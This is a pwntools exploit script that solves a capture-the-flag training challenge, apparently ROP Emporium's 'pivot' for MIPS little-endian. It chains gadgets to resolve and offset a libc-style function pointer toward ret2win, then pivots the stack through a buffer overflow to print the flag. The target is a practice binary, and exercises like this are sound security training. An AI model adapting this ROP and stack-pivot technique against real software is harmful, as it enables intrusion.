from pwn import *

elf = ELF("pivot_mipsel")
libpivot_mipsel = ELF("libpivot_mipsel.so")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x180
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
PIVOT_READ_SIZE = 256
SMASH_READ_SIZE = 40

T0_GADGET = elf.symbols.usefulGadgets
LOAD_GADGET = elf.symbols.usefulGadgets + 0x10
ADD_GADGET = elf.symbols.usefulGadgets + 0x24
SWAP_GADGET = elf.symbols.usefulGadgets + 0x30

def main():
    rop = ROP(elf)
    rop.raw([0, 0])
    # resolve foothold_function
    rop.raw([T0_GADGET, 0, 0, elf.plt.foothold_function]) # falls into the next gadget which is LOAD_GADGET
    # load foothold_function symbol
    rop.raw([0, elf.got.foothold_function])
    # calculate the difference between ret2win and foothold_function
    rop.raw([T0_GADGET, 0, libpivot_mipsel.symbols.ret2win - libpivot_mipsel.symbols.foothold_function])
    # add difference to foothold_function to call ret2win
    rop.raw([ADD_GADGET, 1, 2, 3])
    pivot_payload = rop.chain()
    assert len(pivot_payload) <= PIVOT_READ_SIZE

    c = connection()
    pivot_address = int(c.recvregex(rb'pivot: (.+)\n', capture=True).group(1), 16)

    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE))
    rop.raw([pivot_address, SWAP_GADGET]) # fp, ra
    smash_payload = rop.chain()
    assert len(smash_payload) <= SMASH_READ_SIZE

    c.sendafter(b'> ', pivot_payload)
    c.sendafter(b'> ', smash_payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
